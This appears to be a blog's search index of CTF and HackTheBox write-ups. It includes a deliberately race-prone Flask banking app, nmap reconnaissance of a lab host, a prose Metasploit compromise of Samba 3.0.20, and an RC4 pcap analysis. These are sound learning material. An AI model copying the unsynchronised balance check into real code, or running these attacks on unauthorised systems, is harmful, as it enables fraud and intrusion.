sqlite3.connect(DATABASE) cursor = conn.cursor() cursor.execute(\u0026#34;SELECT funds FROM users WHERE id = ?\u0026#34;, (user_id,)) funds = cursor.fetchone()[0] if funds \u0026gt; 405: return FLAG else: flash(\u0026#39;Insufficient funds!\u0026#39;, \u0026#39;error\u0026#39;) except sqlite3.Error as e: flash(\u0026#39;Error: \u0026#39; + str(e), \u0026#39;error\u0026#39;) finally: conn.close() return redirect(url_for(\u0026#39;index\u0026#39;)) @app.route(\u0026#39;/transfer\u0026#39;) def transfer_funds(): to_user_id = request.args.get(\u0026#39;to_user_id\u0026#39;) from_user_id = request.args.get(\u0026#39;from_user_id\u0026#39;) amount = request.args.get(\u0026#39;amount\u0026#39;) try: conn = sqlite3.connect(DATABASE) cursor = conn.cursor() cursor.execute(\u0026#34;SELECT funds FROM users WHERE id = ?\u0026#34;, (from_user_id,)) from_user_funds = cursor.fetchone()[0] if ( to_user_id != from_user_id and 0 \u0026lt; int(amount) \u0026lt;= 247 and from_user_funds \u0026gt;= int(amount) ): cursor.execute(\u0026#34;UPDATE users SET funds = funds - ? WHERE id = ?\u0026#34;, (amount, from_user_id)) cursor.execute(\u0026#34;UPDATE users SET funds = funds + ? WHERE id = ?\u0026#34;, (amount, to_user_id)) conn.commit() flash(\u0026#39;Funds transferred!\u0026#39;, \u0026#39;success\u0026#39;) else: flash(\u0026#39;Invalid transfer request!\u0026#39;, \u0026#39;error\u0026#39;) except sqlite3.Error as e: flash(\u0026#39;Error: \u0026#39; + str(e), \u0026#39;error\u0026#39;) finally: conn.close() return redirect(url_for(\u0026#39;index\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;) Enjoy :)\n","permalink":"http://localhost:1313/posts/ctf-writeups/amarillo-web-cyberhackathon23/","summary":"\u003cp\u003eThe web security challenge was vulnerable to race condition.\u003c/p\u003e\n\u003cp\u003eThe following was the given website.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/writeups/Amarillo-CTF/1.png\"\u003e\u003c/p\u003e\n\u003cp\u003eThe following were the user details with IDs and funds.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/writeups/Amarillo-CTF/2.png\"\u003e\u003c/p\u003e\n\u003cp\u003ethe /dump path has a comment, which reveals the source code.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/writeups/Amarillo-CTF/3.png\"\u003e\u003c/p\u003e\n\u003cp\u003eThe following part of the code was vulnerable to Race Condition. A race window exists in the if condition. We can send multiple request parallelly, it will bypass the if condition before the deduction of funds.\u003c/p\u003e","title":"Qualifier Web security (El Banco Amarillo) - CyberHackathon'23"},{"content":"Enumeration Initially I tried pinging the IP address. It is reachable.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ ping 10.10.10.3 -c 3 PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data. 64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=173 ms 64 bytes from 10.10.10.3: icmp_seq=2 ttl=63 time=189 ms 64 bytes from 10.10.10.3: icmp_seq=3 ttl=63 time=172 ms --- 10.10.10.3 ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 2004ms rtt min/avg/max/mdev = 171.906/178.070/189.264/7.928 ms I run nmap all ports on it for getting to know the open ports. It shows that the server is down.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ nmap 10.10.10.3 -p- --min-rate 2500 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 10:15 PST Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 1.05 seconds Maybe it was not accepting the ping requests so I used -Pn.\nNow it worked and shows the following results.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ nmap 10.10.10.3 -p- --min-rate 2500 -T4 -Pn Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 10:16 PST Nmap scan report for 10.10.10.3 Host is up (0.18s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3632/tcp open distccd Nmap done: 1 IP address (1 host up) scanned in 52.88 seconds Now I separated the open ports as\n21,22,139,445,3632 Now I can add these ports for Service version enumeration.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/HackTheBox/lame] ‚îî‚îÄ$ nmap -p 21,22,139,445,3632 10.10.10.3 -sC -sV -oN nmapSVscan.txt -Pn Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 10:36 PST Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 100.00% done; ETC: 10:37 (0:00:00 remaining) Nmap scan report for 10.10.10.3 Host is up (0.29s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.6 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA) |_ 2048 5656240f211ddea72bae61b1243de8f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 2h30m24s, deviation: 3h32m10s, median: 22s | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2023-03-03T13:37:39-05:00 |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.19 seconds Exploitation The vsftpd 2.3.4 seems vulnerable. I quicly googled the version and got the it can be exploited with Metasploit. You can check here the guide.\nI opened up the Metasploit, searched for vsftpd and set the options as shown below.\nI failed couple of time, so I stopped further trying the vsftpd.\nI moved to the next potential vulnerability, which i came across when i googled the version of smbd. Which is smbd 3.0.20. I found the following, According to which, we can use metasploit to exploit this.\nI tried exploiting this, as shown below.\nYes, it worked. So I got root access. That was it.\nConclusion The smbd 3.0.20 was outdated and was vulnerable, which we exploited with Metasploit.\nGet more updates and follow me on LinkedIn.\nLinkedIn Link: https://www.linkedin.com/in/muhammadyqb/\nThank You!!\n","permalink":"http://localhost:1313/posts/machine-writeups/lame-hackthebox/","summary":"\u003ch2 id=\"enumeration\"\u003eEnumeration\u003c/h2\u003e\n\u003cp\u003eInitially I tried pinging the IP address. It is reachable.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚îå‚îÄ‚îÄ\u003cspan class=\"o\"\u003e(\u003c/span\u003ekali„âøkali\u003cspan class=\"o\"\u003e)\u003c/span\u003e-\u003cspan class=\"o\"\u003e[\u003c/span\u003e~\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚îî‚îÄ$ ping 10.10.10.3 -c \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePING 10.10.10.3 \u003cspan class=\"o\"\u003e(\u003c/span\u003e10.10.10.3\u003cspan class=\"o\"\u003e)\u003c/span\u003e 56\u003cspan class=\"o\"\u003e(\u003c/span\u003e84\u003cspan class=\"o\"\u003e)\u003c/span\u003e bytes of data.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e64\u003c/span\u003e bytes from 10.10.10.3: \u003cspan class=\"nv\"\u003eicmp_seq\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003ettl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e63\u003c/span\u003e \u003cspan class=\"nv\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e173\u003c/span\u003e ms\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e64\u003c/span\u003e bytes from 10.10.10.3: \u003cspan class=\"nv\"\u003eicmp_seq\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"nv\"\u003ettl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e63\u003c/span\u003e \u003cspan class=\"nv\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e189\u003c/span\u003e ms\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e64\u003c/span\u003e bytes from 10.10.10.3: \u003cspan class=\"nv\"\u003eicmp_seq\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e \u003cspan class=\"nv\"\u003ettl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e63\u003c/span\u003e \u003cspan class=\"nv\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e172\u003c/span\u003e ms\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--- 10.10.10.3 ping statistics ---\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e packets transmitted, \u003cspan class=\"m\"\u003e3\u003c/span\u003e received, 0% packet loss, \u003cspan class=\"nb\"\u003etime\u003c/span\u003e 2004ms\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ertt min/avg/max/mdev \u003cspan class=\"o\"\u003e=\u003c/span\u003e 171.906/178.070/189.264/7.928 ms\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eI run nmap all ports on it for getting to know the open ports. It shows that the server is down.\u003c/p\u003e","title":"HackTheBox Lame Machine WriteUps"},{"content":"A pcap file was being given for analysis.\nThe pcap file was being opened in the wireshark.\nI applied the http filter to filter only http requests.\nThere was a zip file that was retrieved through http protocol. There was nothing interesting in this zip file.\nI moved on, and i found that many requests were being made to the /f_data/data endpoint. All the requests were giving 403 forbidden response except the last one, which gave 200 OK response.\nI sent it HTTP Stream as shown below. In response there was data, which i didn\u0026rsquo;t understand initially.\nWhen i dig further then i got another message, which was giving us a hint that the previous data possibly encrypted with RC4 algorithm. But for that we need a key, and we do not have key yet.\nWhen i further analyzed the same http data, there was another message, which gave us the key. It was sending request to /f.php with different values for the get parameter t. When i combined the parameters values, it was secret which might be the key.\nSo now its time to put everything together and try it. I opened cyberchef and chose the RC4 algorithm. I put all the found info as shown below.\nI didn\u0026rsquo;t work :). The data we copied from the Wireshark was in ASCII format, which was the mistake. ASCII has limitations in representing characters beyond the basic Latin alphabet. So it is possible that data includes characters from different character sets (e.g., UTF-8). So, i chose RAW format from the Wireshark as shown below.\nNow, i copied the data in last line, as which is the data in response.\nThis time, i used the RAW format data in cyberchef, which worked as shown.\nHope you liked it.\n","permalink":"http://localhost:1313/posts/ctf-writeups/warmy-networksecurity-cyberhackathon23/","summary":"\u003cp\u003eA pcap file was being given for analysis.\u003c/p\u003e\n\u003cp\u003eThe pcap file was being opened in the wireshark.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/writeups/warmy-CTF/1.png\"\u003e\u003c/p\u003e\n\u003cp\u003eI applied the \u003ccode\u003ehttp\u003c/code\u003e filter to filter only http requests.\u003c/p\u003e\n\u003cp\u003eThere was a zip file that was retrieved through http protocol. There was nothing interesting in this zip file.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/writeups/warmy-CTF/2.png\"\u003e\u003c/p\u003e\n\u003cp\u003eI moved on, and i found that many requests were being made to the \u003ccode\u003e/f_data/data\u003c/code\u003e endpoint. All the requests were giving \u003ccode\u003e403 forbidden\u003c/code\u003e response except the last one, which gave \u003ccode\u003e200 OK\u003c/code\u003e response.\u003c/p\u003e","title":"Qualifier Network Security (Warmy) - CyberHackathon'23"},{"content":"In the following blog post, I will be recounting my personal experience taking the CEH practical exam, while also providing valuable guidance on how to prepare for this beginner-friendly certification.\nGeneral Info about the CEH Practical Key value Price 550$ (Without training) Questions 20 Passing score 70% (14/20) Allowed time 6 Hours Proctored? Yes Link to purchase Here Cost Back in November 2022, during the Cyber Monday deal, I purchased the exam voucher for a cost of $150.\nPreparation Since I am in my final year of BS Cybersecurity, I have already obtained a solid understanding of many general concepts. Therefore, I have not enrolled in any additional courses.\nScheduling To schedule the exam, it is required to do so through the Aspen dashboard at least one month in advance.\nExam Day Review In preparation for the exam scheduled at 11 PM, I prioritized getting sufficient rest during the day to ensure a fresh and focused mind. As the exam process began through my dashboard at the designated time, I was prompted with a GoToMeeting link. Realizing I did not have the application installed, I proceeded to download it. To avoid similar issues, I recommend downloading the GoToMeeting application prior to starting the exam. After waiting for approximately 15 minutes with no response, I suspected the proctor may have missed the meeting and reached out to EC Council\u0026rsquo;s live support team. They provided me with an alternative link where the proctor was already waiting. If you experience a similar delay and your proctor has not joined the meeting after 10 to 15 minutes, I advise reaching out to the support team for assistance.\nBefore the exam, the proctor instructed me to enable my microphone, camera, and screen sharing. After following his instructions, he then asked me to show my surroundings to ensure no one was present to provide assistance. Once that was confirmed, he provided all the necessary information to start the exam.\nThe exam consisted of 20 questions and required the use of two browser based machines, a Windows and a Parrot machine.\nInitially, I focused on tasks that were focused on Parrot OS, I discovered all the hosts in the network and did enumeration of all the discovered hosts.\nI shifted to tasks that we can do with Windows after doing all the Linux based tasks. All the questions were very easy.\nThe questions were something like,\nWhat is the ftp password of John? What is the version of SSH? How many Windows machines are there? What is machine IP of windows machine running RDP? The windows based tasks were related to using cryptography, hashing and steganography tools etc. Tools If you want to do preparation for the CEH practical exam, you will need to be proficient in the following tools.\nnmap wireshark John the ripper Cryptool BCTextEditor Veracrypt Openstego Snow Hydra xfreerdp etc Conclusion The certification exam is beginner friendly. If you have the basic understanding of how to use different tools, you can pass the exam easily.\nThank you for taking the time to read this blog. I hope you found it informative and enjoyable. If you have any questions or comments, feel free to connect with me on LinkedIn. I would be delighted to connect with you and continue the conversation.\nLinkedIn: https://www.linkedin.com/in/muhammadyqb/\n","permalink":"http://localhost:1313/posts/certification-reviews/ceh-practical/","summary":"\u003cp\u003eIn the following blog post, I will be recounting my personal experience taking the CEH practical exam, while also providing valuable guidance on how to prepare for this beginner-friendly certification.\u003c/p\u003e\n\u003ch2 id=\"general-info-about-the-ceh-practical\"\u003eGeneral Info about the CEH Practical\u003c/h2\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eKey\u003c/th\u003e\n          \u003cth\u003evalue\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePrice\u003c/td\u003e\n          \u003ctd\u003e550$ (Without training)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eQuestions\u003c/td\u003e\n          \u003ctd\u003e20\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePassing score\u003c/td\u003e\n          \u003ctd\u003e70% (14/20)\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eAllowed time\u003c/td\u003e\n          \u003ctd\u003e6 Hours\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eProctored?\u003c/td\u003e\n          \u003ctd\u003eYes\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eLink to purchase\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://iclass.eccouncil.org/product/ceh-practical-exam/#:~:text=CEH%20Practical%20is%20a%20six,solve%20a%20security%20audit%20challenge.\"\u003eHere\u003c/a\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 id=\"cost\"\u003eCost\u003c/h2\u003e\n\u003cp\u003eBack in November 2022, during the Cyber Monday deal, I purchased the exam voucher for a cost of $150.\u003c/p\u003e","title":"CEH Exam Review"},{"content":"üìã OSCP Preparation: To-Do List ‚úÖ Progress 10 Boxes Owned out of 43 üéâ Completion Rate: 23.3% üí™ üü¢ Linux Boxes Busqueda (Write-up) UpDown Sau (Walkthrough) Help (Done) Broker (Done) Intentions Soccer (Done) Keeper (Write-up) Monitored BoardLight Networked CozyHosting Editorial (Done) Magic Pandora Builder (Done) LinkVortex (Done) Usage (Done) üü° Windows Boxes Escape Servmon Support StreamIO Blackfield Intelligence Jeeves Manager Access Aero Mailing Administrator Certified üü£ Active Directory (AD) Boxes Active Forest Sauna Monteverde Timelapse Return Cascade Flight Blackfield Cicada Escape Adagio (HTB Enterprise Box) Happy Hacking! üöÄ\n","permalink":"http://localhost:1313/todo/","summary":"To-Do List of Boxes for OSCP Preparation","title":"OSCP Preparation: To-Do List"}]